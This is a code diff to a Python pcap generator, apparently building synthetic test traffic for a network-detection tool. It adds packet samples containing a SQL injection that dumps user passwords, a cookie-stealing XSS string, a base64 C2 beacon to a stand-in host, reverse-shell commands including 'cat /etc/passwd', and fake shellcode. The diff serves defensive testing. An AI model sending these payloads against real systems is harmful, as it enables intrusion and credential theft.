@@ -146,6 +146,24 @@ def _get_recipes():
         (_build_tcp("10.0.0.99", "10.0.0.1", 49000, 3389, dpkt.tcp.TH_SYN), "TCP RDP SYN"),
         # FIN-ACK teardown
         (_build_tcp("192.168.1.10", "93.184.216.34", 54321, 80, dpkt.tcp.TH_FIN | dpkt.tcp.TH_ACK, seq=1050), "TCP FIN-ACK"),
+        # Plaintext Credential Exposure
+        (_build_tcp("192.168.1.10", "192.168.1.200", 54330, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
+                    payload=b"POST /login HTTP/1.1\r\nHost: target-portal.local\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin&password=SuperSecretPassword999!"), "TCP Plaintext Password"),
+        # SQL Injection (SQLi) attempt
+        (_build_tcp("10.0.0.99", "192.168.1.200", 49100, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
+                    payload=b"GET /search?q=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users-- HTTP/1.1\r\nHost: target-portal.local\r\n\r\n"), "TCP SQL Injection"),
+        # Cross-Site Scripting (XSS) payload
+        (_build_tcp("10.0.0.99", "192.168.1.200", 49101, 80, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
+                    payload=b"GET /comments?msg=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1\r\nHost: target-portal.local\r\n\r\n"), "TCP XSS Payload"),
+        # Base64-obfuscated C2 beacon IOC
+        (_build_tcp("192.168.1.10", "198.51.100.5", 54400, 8080, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
+                    payload=b"POST /api/telemetry HTTP/1.1\r\nHost: c2-node.net\r\n\r\ndata=aHR0cDovL21hbGljaW91cy1jMi1zZXJ2ZXIueHl6L2JlYWNvbi5waHA/aWQ9MTMzNw==\r\n"), "TCP Base64 C2 Payload"),
+        # Metasploit Reverse Shell session on port 4444
+        (_build_tcp("10.0.0.99", "192.168.1.15", 4444, 50123, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
+                    payload=b"whoami\nid\n/bin/sh -i\ncat /etc/passwd\n"), "TCP Metasploit C2 Shell"),
+        # High entropy shellcode payload on non-TLS port
+        (_build_tcp("10.0.0.99", "192.168.1.15", 55221, 1337, dpkt.tcp.TH_ACK | dpkt.tcp.TH_PUSH,
+                    payload=bytes([(x * 17 + 43) % 256 for x in range(512)])), "High Entropy Shellcode"),
     ]
 
 
@@ -165,7 +183,7 @@ def generate_pcap(out_path: Path, count: int = 50) -> None:
             ts = base_ts + i * 0.05  # 50ms inter-packet gap
             writer.writepkt(eth_bytes, ts=ts)
 
-    print(f"✓ Written {count} packets → {out_path}")
+    print(f"[+] Written {count} packets -> {out_path}")
 
 
 # ── CLI ───────────────────────────────────────────────────────────────────────
